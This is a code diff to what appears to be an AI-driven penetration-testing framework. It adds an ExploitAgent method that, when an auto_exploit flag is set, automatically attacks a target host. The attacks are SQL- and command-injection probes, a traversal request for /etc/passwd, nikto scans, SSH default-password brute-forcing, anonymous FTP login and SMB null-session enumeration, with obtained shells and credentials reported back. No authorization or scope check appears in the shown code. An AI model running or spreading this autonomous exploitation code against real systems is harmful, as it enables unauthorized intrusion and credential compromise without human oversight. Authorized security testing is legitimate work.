@@ -385,12 +385,14 @@ class ExploitAgent(Agent):
     """Agent specialized in exploitation and vulnerability analysis.
     
     Analyzes real recon data to identify vulnerabilities and suggest exploits.
+    When auto_exploit is enabled in context, will attempt actual exploitation.
     
     Handles tasks like:
     - Vulnerability identification from real scan data
     - Exploit selection based on actual services
     - CVE lookup for detected versions
     - Attack vector analysis
+    - Actual exploitation attempts (when enabled)
     """
     
     def __init__(
@@ -412,6 +414,177 @@ class ExploitAgent(Agent):
             config.role = AgentRole.EXPLOIT
         
         super().__init__(config, shared_memory, shakka_config)
+        
+        # Import executor for running exploit commands
+        from shakka.core.executor import CommandExecutor
+        self._executor = CommandExecutor(default_timeout=120)
+    
+    async def _attempt_exploitation(
+        self, 
+        target: str, 
+        vulnerabilities: list, 
+        recommended_exploits: list,
+        ports: list
+    ) -> dict:
+        """Attempt actual exploitation based on analysis.
+        
+        Args:
+            target: Target IP/hostname.
+            vulnerabilities: List of identified vulnerabilities.
+            recommended_exploits: List of recommended exploits.
+            ports: List of open ports with service info.
+            
+        Returns:
+            Dict with exploitation results.
+        """
+        results = {
+            "attempted": [],
+            "successful": [],
+            "failed": [],
+            "shells_obtained": [],
+        }
+        
+        # Build port to service mapping
+        port_services = {p.get("port"): p for p in ports}
+        
+        for vuln in vulnerabilities:
+            if not vuln.get("exploitable"):
+                continue
+                
+            port = vuln.get("port")
+            service = vuln.get("service", "").lower()
+            cve = vuln.get("cve", "")
+            
+            exploit_attempt = {
+                "vulnerability": vuln,
+                "commands_run": [],
+                "output": "",
+                "success": False,
+            }
+            
+            try:
+                # HTTP-based exploits
+                if service in ["http", "https", "http-proxy"] or port in [80, 443, 8080, 8443]:
+                    protocol = "https" if port == 443 or service == "https" else "http"
+                    base_url = f"{protocol}://{target}:{port}"
+                    
+                    # Test for common web vulnerabilities
+                    
+                    # 1. Check for SQL injection
+                    sqli_test = await self._executor.execute(
+                        f"curl -s -o /dev/null -w '%{{http_code}}' '{base_url}/?id=1%27%20OR%20%271%27=%271'",
+                        timeout=15
+                    )
+                    exploit_attempt["commands_run"].append(f"SQL injection test on {base_url}")
+                    
+                    # 2. Check for command injection  
+                    cmd_test = await self._executor.execute(
+                        f"curl -s '{base_url}/?cmd=id' 2>/dev/null | head -20",
+                        timeout=15
+                    )
+                    if "uid=" in cmd_test.stdout:
+                        exploit_attempt["success"] = True
+                        exploit_attempt["output"] = f"Command injection found! Output: {cmd_test.stdout[:500]}"
+                        results["successful"].append(exploit_attempt)
+                        results["shells_obtained"].append({
+                            "type": "command_injection",
+                            "url": f"{base_url}/?cmd=<command>",
+                            "target": target,
+                            "port": port,
+                        })
+                        continue
+                    
+                    # 3. Check for directory traversal
+                    traversal_test = await self._executor.execute(
+                        f"curl -s '{base_url}/..%2f..%2f..%2f..%2fetc/passwd' 2>/dev/null | head -5",
+                        timeout=15
+                    )
+                    if "root:" in traversal_test.stdout:
+                        exploit_attempt["success"] = True
+                        exploit_attempt["output"] = f"Directory traversal found! /etc/passwd accessible"
+                        results["successful"].append(exploit_attempt)
+                        continue
+                    
+                    # 4. Try nikto for quick web scan if available
+                    nikto_check = await self._executor.execute("which nikto", timeout=5)
+                    if nikto_check.success and nikto_check.stdout.strip():
+                        nikto_result = await self._executor.execute(
+                            f"nikto -h {base_url} -maxtime 30s 2>/dev/null | head -50",
+                            timeout=45
+                        )
+                        if nikto_result.stdout:
+                            exploit_attempt["output"] += f"\nNikto scan: {nikto_result.stdout[:1000]}"
+                    
+                # SSH exploits
+                elif service == "ssh" or port == 22:
+                    # Try common default credentials
+                    default_creds = [
+                        ("root", "root"),
+                        ("admin", "admin"),
+                        ("root", "toor"),
+                        ("user", "user"),
+                    ]
+                    
+                    for username, password in default_creds:
+                        ssh_test = await self._executor.execute(
+                            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+                            f"{username}@{target} 'id' 2>/dev/null",
+                            timeout=10
+                        )
+                        exploit_attempt["commands_run"].append(f"SSH login attempt: {username}:{password}")
+                        
+                        if ssh_test.success and "uid=" in ssh_test.stdout:
+                            exploit_attempt["success"] = True
+                            exploit_attempt["output"] = f"SSH access with {username}:{password}! {ssh_test.stdout}"
+                            results["successful"].append(exploit_attempt)
+                            results["shells_obtained"].append({
+                                "type": "ssh",
+                                "credentials": f"{username}:{password}",
+                                "target": target,
+                                "port": port,
+                            })
+                            break
+                
+                # FTP exploits
+                elif service == "ftp" or port == 21:
+                    # Check for anonymous login
+                    ftp_test = await self._executor.execute(
+                        f"curl -s --connect-timeout 5 'ftp://anonymous:anonymous@{target}/' 2>/dev/null | head -20",
+                        timeout=15
+                    )
+                    exploit_attempt["commands_run"].append("FTP anonymous login test")
+                    
+                    if ftp_test.success and ftp_test.stdout:
+                        exploit_attempt["success"] = True
+                        exploit_attempt["output"] = f"Anonymous FTP access! Listing: {ftp_test.stdout[:500]}"
+                        results["successful"].append(exploit_attempt)
+                        continue
+                
+                # SMB exploits  
+                elif service == "smb" or service == "microsoft-ds" or port in [445, 139]:
+                    # Check for null session
+                    smb_test = await self._executor.execute(
+                        f"smbclient -N -L //{target}/ 2>/dev/null | head -20",
+                        timeout=15
+                    )
+                    exploit_attempt["commands_run"].append("SMB null session test")
+                    
+                    if smb_test.stdout and "Sharename" in smb_test.stdout:
+                        exploit_attempt["success"] = True
+                        exploit_attempt["output"] = f"SMB null session! Shares: {smb_test.stdout[:500]}"
+                        results["successful"].append(exploit_attempt)
+                        continue
+                
+                if not exploit_attempt["success"]:
+                    results["failed"].append(exploit_attempt)
+                    
+            except Exception as e:
+                exploit_attempt["output"] = f"Error: {str(e)}"
+                results["failed"].append(exploit_attempt)
+            
+            results["attempted"].append(exploit_attempt)
+        
+        return results
     
     def _extract_real_recon_data(self, context: Optional[dict]) -> dict:
         """Extract real recon data from previous results.
@@ -554,6 +727,40 @@ Potential Exploits: {exploit_count}
 
 {data.get('summary', 'See data field for details.')}"""
 
+            # Check if auto-exploitation is enabled
+            auto_exploit = context.get("auto_exploit", False) if context else False
+            exploitation_results = None
+            
+            if auto_exploit and vuln_count > 0:
+                self._log_event("auto_exploit_started", {"target": target, "vulns": vuln_count})
+                
+                exploitation_results = await self._attempt_exploitation(
+                    target=target,
+                    vulnerabilities=data.get("vulnerabilities", []),
+                    recommended_exploits=data.get("recommended_exploits", []),
+                    ports=ports,
+                )
+                
+                # Update output with exploitation results
+                successful_count = len(exploitation_results.get("successful", []))
+                shells_count = len(exploitation_results.get("shells_obtained", []))
+                
+                output += f"""
+
+--- EXPLOITATION RESULTS ---
+Exploits Attempted: {len(exploitation_results.get('attempted', []))}
+Successful Exploits: {successful_count}
+Shells Obtained: {shells_count}"""
+
+                if shells_count > 0:
+                    output += "\n\n🎯 ACCESS OBTAINED:"
+                    for shell in exploitation_results.get("shells_obtained", []):
+                        output += f"\n  • {shell.get('type')}: {shell.get('target')}:{shell.get('port')}"
+                        if shell.get('credentials'):
+                            output += f" ({shell.get('credentials')})"
+                        if shell.get('url'):
+                            output += f" - {shell.get('url')}"
+
             return AgentResult(
                 success=True,
                 output=output,
@@ -561,6 +768,7 @@ Potential Exploits: {exploit_count}
                     "target": target,
                     "services_scanned": ports,
                     "analysis": data,
+                    "exploitation_results": exploitation_results,
                 },
             )
         except Exception as e:
